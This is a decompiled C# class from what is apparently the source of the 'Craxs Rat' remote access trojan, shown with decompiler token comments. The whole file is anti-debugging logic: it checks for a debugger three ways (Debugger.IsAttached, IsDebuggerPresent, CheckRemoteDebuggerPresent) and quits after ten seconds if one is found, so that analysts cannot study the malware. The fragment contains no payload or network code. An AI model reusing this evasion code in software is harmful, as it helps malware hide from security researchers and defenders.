using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Craxs_Rat
{
	// Token: 0x02000014 RID: 20
	internal class Class4
	{
		// Token: 0x060001AD RID: 429
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool pbDebuggerPresent);

		// Token: 0x060001AE RID: 430
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool IsDebuggerPresent();

		// Token: 0x060001AF RID: 431 RVA: 0x0000F920 File Offset: 0x0000DB20
		public static void smethod_0()
		{
			if (Class4.smethod_1() == 1)
			{
				Thread.Sleep(10000);
				Environment.Exit(0);
			}
			if (Class4.smethod_2() == 1)
			{
				Thread.Sleep(10000);
				Environment.Exit(0);
			}
			if (Class4.smethod_3() == 1)
			{
				Thread.Sleep(10000);
				Environment.Exit(0);
			}
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x0000F97C File Offset: 0x0000DB7C
		private static int smethod_1()
		{
			int result;
			if (!Debugger.IsAttached)
			{
				result = 0;
			}
			else
			{
				result = 1;
			}
			return result;
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0000F998 File Offset: 0x0000DB98
		private static int smethod_2()
		{
			int result;
			if (Class4.IsDebuggerPresent())
			{
				result = 1;
			}
			else
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0000F9B4 File Offset: 0x0000DBB4
		private static int smethod_3()
		{
			bool flag = false;
			int result;
			if (Class4.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag) && flag)
			{
				result = 1;
			}
			else
			{
				result = 0;
			}
			return result;
		}
	}
}
